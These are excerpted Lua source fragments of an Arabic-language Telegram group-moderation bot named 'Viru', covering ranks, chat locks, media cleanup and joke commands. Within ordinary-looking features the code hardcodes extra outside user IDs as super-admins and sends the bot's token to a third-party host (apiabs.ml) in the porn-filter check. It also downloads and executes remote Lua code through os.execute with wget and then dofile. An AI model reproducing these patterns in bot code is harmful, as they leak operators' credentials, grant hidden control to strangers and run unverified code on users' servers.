...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1445010567,1391769117,1466244479,1658973724}
Viru = Config.Viru
...
{{text="↯ السورس .",url="https://t.me/sITITs"},{text="↯ لتنصيب بوت .",url="https://t.me/VVJAA"}},
}
...
if DevRio:get(Viru..'Rio:Lock:NightClub'..msg.chat_id_) and msg.reply_to_message_id_ == 0 then
...
HttpsMsg = https.request('https://apiabs.ml/nightclub.php?Get=Viru&TokenBot='..TokenBot..'&Url='..UrlId)
...
if DevRio:get(Viru.."Rio:Left:Bot"..Viru) and not Bot(msg) then
...
function ViruTeam(extra,result,success)
if DevRio:get(Viru.."Rio:Send:Bot"..Viru) and not SecondSudo(msg) then 
...
{{text = '↯ Developer',url="t.me/VVJAA"},{text = '↯ Tws Viru',url="https://t.me/@Qusai9_bot"}},
}
...
local DevText = DevRio:get(Viru.."DevText")
if DevRio:get(Viru.."Rio:ChId") then DevCh = '\n↯︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
...
if DevRio:sismember(Viru..'Rio:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevRio:sismember(Viru..'Rio:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevRio:sismember(Viru..'Rio:VipAll:',result.sender_user_id_) then
...
DevRio:srem(Viru..'Rio:ManagerAll:', result.sender_user_id_)
DevRio:srem(Viru..'Rio:AdminAll:', result.sender_user_id_)
DevRio:srem(Viru..'Rio:VipAll:', result.sender_user_id_)
...
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(Viru..'Rio:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevRio:sismember(Viru..'Rio:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevRio:sismember(Viru..'Rio:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
...
DevRio:srem(Viru..'Rio:ManagerAll:', result.id_)
DevRio:srem(Viru..'Rio:AdminAll:', result.id_)
DevRio:srem(Viru..'Rio:VipAll:', result.id_)
...
DevRio:sadd(Viru..'Rio:ManagerAll:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Viru..'Rio:ManagerAll:',result.id_)
...
DevRio:sadd(Viru..'Rio:ManagerAll:',user)
...
DevRio:srem(Viru..'Rio:ManagerAll:',user)
...
function raf_reply(extra, result, success)
DevRio:sadd(Viru..'Rio:AdminAll:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Viru..'Rio:AdminAll:',result.id_)
...
DevRio:sadd(Viru..'Rio:AdminAll:',user)
...
DevRio:srem(Viru..'Rio:AdminAll:',user)
...
function raf_reply(extra, result, success)
DevRio:sadd(Viru..'Rio:VipAll:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Viru..'Rio:VipAll:',result.id_)
...
DevRio:sadd(Viru..'Rio:VipAll:',user)
...
DevRio:srem(Viru..'Rio:VipAll:',user)
...
function raf_reply(extra, result, success)
DevRio:sadd(Viru..'Rio:RioConstructor:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Viru..'Rio:RioConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Viru..'Rio:RioConstructor:'..msg.chat_id_,user)
...
DevRio:srem(Viru..'Rio:RioConstructor:'..msg.chat_id_,result.sender_user_id_)
...
DevRio:srem(Viru..'Rio:RioConstructor:'..msg.chat_id_,result.id_)
...
DevRio:srem(Viru..'Rio:RioConstructor:'..msg.chat_id_,user)
...
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevRio:get(Viru.."Rio:Lock:ProSet"..msg.chat_id_) then 
...
if not Constructor(msg) and DevRio:get(Viru.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevRio:get(Viru..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Viru.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevRio:sadd(Viru.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
...
local List = DevRio:smembers(Viru..'Rio:RioConstructor:'..msg.chat_id_)
text = "↯︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Viru..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Viru..'Rio:ManagerAll:')
...
local List = DevRio:smembers(Viru..'Rio:VipAll:')
...
if not DevRio:get(Viru..'Rio:Lock:NightClub'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم قفل الاباحي")  
DevRio:set(Viru..'Rio:Lock:NightClub'..msg.chat_id_,true)
else
...
changeChatMemberStatus(group[i], Viru, "Left")
w = w + 1
end
...
if msg and DevRio:get(Viru..'Rio:Lock:Clean'..msg.chat_id_) then
...
if DevRio:scard(Viru.."Rio:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevRio:smembers(Viru.."Rio:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
...
if DevRio:get(Viru..'Rio:Lock:NightClub'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم فتح الاباحي")  
DevRio:del(Viru..'Rio:Lock:NightClub'..msg.chat_id_)
else
...
DevRio:del(Viru..'Rio:ManagerAll:')
end
...
if DevRio:get(Viru..'Rio:Lock:NightClub'..msg.chat_id_) then mute_nightclub = 'مقفل' else mute_nightclub = 'مفتوح' end
...
if text and text:match("^انطق (.*)$") and not DevRio:get(Viru..'Rio:Antk:Rio'..msg.chat_id_) then
...
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevRio:get(Viru..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevRio:get(Viru..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevRio:get(Viru..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevRio:get(Viru..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and (text == "اغنيه" or text == "↫ اغنيه ↯" or text == "اغاني") and not DevRio:get(Viru..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
...
if text and (text == "ريمكس" or text == "↫ ريمكس ↯") and not DevRio:get(Viru..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,612); 
local Text ='*↯︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '↯ ViruTeam .',url="t.me/sITITs"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ViruTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Viru..'Rio:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local ViruTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل اوامر التحشيش'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ViruTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Viru..'Rio:Lock:Stupid'..msg.chat_id_,true)
end
--     Source Viru     --
...
os.execute('wget https://raw.githubusercontent.com/Viru-Team/Viru/master/Viru.lua') 
dofile('Viru.lua') 
...
DevRio:set(Viru.."Rio:ChId",DevRio:get(Viru.."DevRio2"))
DevRio:del(Viru.."DevRio2")
end
if DevRio:get(Viru.."Rio:textch:user") then
DevRio:set(Viru.."Rio:ChText",DevRio:get(Viru.."Rio:textch:user"))
DevRio:del(Viru.."Rio:textch:user")
end
--     Source Viru     --
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/Viru-Team/ViruFiles/master/getfile.json")
if res == 200 then
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/Viru-Team/ViruFiles/master/ViruFiles/"..FileName)
if Res == 200 then
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/VVJAA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source Viru     --
if RioSudo(msg) then 
...
if DevRio:get(Viru..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
